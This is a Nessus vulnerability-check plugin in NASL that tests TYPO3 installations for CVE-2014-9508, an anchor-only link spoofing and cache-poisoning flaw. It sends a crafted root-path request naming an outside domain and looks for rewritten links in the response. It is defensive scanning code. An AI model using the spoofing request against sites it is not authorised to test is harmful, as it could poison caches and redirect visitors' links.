#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(81575);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/03/02 14:34:38 $");

  script_cve_id("CVE-2014-9508");
  script_bugtraq_id(71646);
  script_osvdb_id(115852);

  script_name(english:"TYPO3 Anchor-only Links Remote Spoofing Vulnerability");
  script_summary(english:"Attempts to exploit the URL spoofing vulnerability.");

  script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a URL spoofing vulnerability.");
  script_set_attribute(attribute:"description", value:
"The TYPO3 content management system running on the remote host is
affected by a URL spoofing vulnerability involving anchor-only links
on the homepage. A remote attacker, using a specially crafted request,
can modify links so they point to arbitrary domains. Furthermore, an
attacker can utilize this vulnerability to poison the cache in order
to temporarily alter the links on the index page until cache
expiration.");
  # http://typo3.org/teams/security/security-bulletins/typo3-core/typo3-core-sa-2014-003/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?940a47ed");
  script_set_attribute(attribute:"solution", value:
"Upgrade to a patched version or set the 'config.absRefPrefix'
configuration option to a non-empty value.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/12/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/12/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/02/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:typo3:typo3");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencie("typo3_detect.nasl");
  script_require_keys("installed_sw/TYPO3", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "TYPO3";

# the url spoof will only work against the root URL
# therefore, we only want to test once per port
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

exploit_url = "/http://www.tenable.com/?no_cache=1";
res = http_send_recv3(
  method       : "GET",
  port         : port,
  item         : exploit_url,
  exit_on_fail : TRUE);

# look for successfully spoofed anchor links
item = eregmatch(pattern: "<a\s*href\s*=\s*(" +
  "'http://www\.tenable\.com/\?no_cache=1#[^']*'|" +
  '"http://www\\.tenable\\.com/\\?no_cache=1#[^"]*"' +
  ")\s*>", string:res[2]);

# double check we are indeed looking at a TYPO3 install
# and that the exploit was successful
if("powered by TYPO3" >< res[2] &&
   !isnull(item))
{
  security_report_v4(
    port        : port,
    generic    : TRUE,
    severity    : SECURITY_WARNING,
    request     : make_list(build_url(qs:exploit_url, port:port)),
    output      : '\n' + item[0]
  );
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(port:port, qs:'/'));
